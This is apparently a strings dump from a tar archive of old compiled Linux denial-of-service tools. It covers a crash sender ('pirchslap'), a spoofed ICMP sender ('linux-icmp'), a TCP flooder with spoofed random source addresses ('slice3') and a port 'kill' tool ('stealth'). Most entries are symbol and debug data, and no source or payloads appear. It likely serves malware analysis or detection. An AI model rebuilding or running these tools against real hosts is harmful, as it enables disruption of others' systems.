            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "galt_gin.c",
            "in_cksum",
            "optstring.12",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "datasize",
            "__errno_location@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "source",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "strtol@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "strcat@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "delay",
            "_fini",
            "srand@@GLIBC_2.0",
            "doresolve",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "docmdline",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "thestring",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "mcommand",
            "optind@@GLIBC_2.0",
            "subnetmode",
            "target",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/pirchslap",
            "0100755",
            "0000000",
            "0000000",
            "00000032060",
            "07100656661",
            "014053",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "perror",
            "socket",
            "bzero",
            "send",
            "inet_addr",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh$",
            "E1fE",
            "t$EP",
            "u&hX",
            "\u0403;u[]",
            "gethostbyname()",
            "connect()",
            "Connected to [%s:%d].",
            "Usage: %s <target>",
            "socket()",
            "Sending crash....",
            "1st crash sent...",
            "Sending crash....",
            "2nd crash sent...",
            "Sending crash.... ",
            "3rd crash sent...",
            "Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "pirchslap.c",
            "_DYNAMIC",
            "host",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "open_sock",
            "spoofedaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/linux-icmp",
            "0100755",
            "0000000",
            "0000000",
            "00000033566",
            "07100656630",
            "014163",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "perror",
            "socket",
            "fflush",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "gethostbyname",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhT",
            "U1fE",
            "fE1fU",
            "U<WVSE",
            "MLEEp",
            "ME\u04cbE\u040d4",
            ")\u078bU)E\u0308",
            "UU\u0339Mb",
            "E)\u0409E]\u0703E",
            "PEPE",
            ")\u0289U\u060bM",
            ")\u0449)\u0289\u05c9",
            "U)}\u043f\u044d<",
            ")M\u050b}",
            ")\u03c9)\u03c9",
            "E\u043e\u044d4",
            ")\u0389)\u0389",
            "\u0609E\u043bE\u044bE\u030d",
            ")\u02cbE)\u060bU",
            "E\u0339$IEE\u030d",
            "\tE)\u0422T",
            "bE\u0339gfffE",
            "E)\u0222U",
            "E\u0339EE\u030d",
            ")\u044bE)fZ",
            "U\u0709Pj",
            "EP u",
            "e[^_]",
            "\u0403;u[]",
            "Unable to get host name",
            "Usage: %s <ip_addr> <port>",
            "Can't set IP_HDRINCL option on socket",
            "b00m ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "linux-icmp.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "sock_open",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "icmph",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/slice3",
            "0100755",
            "0000000",
            "0000000",
            "00000020114",
            "07071421552",
            "013241",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "printf",
            "random",
            "_DYNAMIC",
            "memcpy",
            "_IO_stderr_",
            "perror",
            "malloc",
            "socket",
            "__environ",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "__fpu_control",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "gettimeofday",
            "memset",
            "time",
            "gethostbyname",
            "_fini",
            "sprintf",
            "atexit",
            "srandom",
            "_GLOBAL_OFFSET_TABLE_",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "Pg[&",
            "WVSU",
            "e[^_Uhx",
            "P Ru",
            "6U4S]",
            "M@eM",
            "fEfE",
            "fEP~",
            "eeee\u07c0e?h",
            "fEfE",
            "EPEP~",
            "U<SE",
            "]+]\u0309]\u0703}",
            "E\u0309EE9Es",
            ")\u04c9]E",
            ")\u04c9]EPEPEPEPhP",
            "E\u040bEPEPEP",
            "\u0403;u[",
            "[JSignal Caught. Exiting Cleanly.",
            "[JSegmentation Violation Caught. Exiting Cleanly.",
            "Unknown host %s",
            "sendto",
            "Usage: %s srcaddr dstaddr low high",
            "    If srcaddr is 0, random addresses will be used",
            "socket",
            "%i.%i.%i.%i",
            "High port must be greater than Low port.",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "slice2.c",
            "send_tcp_segment",
            "srcport",
            "printf",
            "random",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "spoof_open",
            "memcpy",
            "_IO_stderr_",
            "perror",
            "malloc",
            "socket",
            "getaddr",
            "__environ",
            "sig_segv",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "__fpu_control",
            "_start",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "curc",
            "___crt_dummy__",
            "ack_seq",
            "gettimeofday",
            "__bss_start",
            "memset",
            "main",
            "ssock",
            "time",
            "sig_exit",
            "gethostbyname",
            "_fini",
            "sprintf",
            "atexit",
            "srandom",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "init_signals",
            "datapool/bin/stealth",
            "0100755",
            "0000000",
            "0000000",
            "00000031443",
            "07100656700",
            "013530",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "socket",
            "bzero",
            "send",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "fEh@",
            "fU1fEP*",
            "UPEP",
            "\u0403;u[]",
            "[1mStealth",
            "[0m> %s ",
            "[1;30m:",
            "[0m port %d",
            "[1mStealth",
            "[0m> Non",
            "[1;30m-",
            "[0mexistant host",
            "[1;30m:",
            "[0m %s",
            "[1;30mtw",
            "[0mit",
            "[1mch@St",
            "[0meal",
            "[1;30mth",
            "[33m:",
            "[1;5;31mThis tool is extremely dangerous. Use at your own risk!",
            "[1;30mUsage:",
            "[0m st",
            "[1m-",
            "[0mkill <",
            "[1mhost",
            "[0m> <",
            "[1mport",
            "[0m>",
            "0123456789ABCDE",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
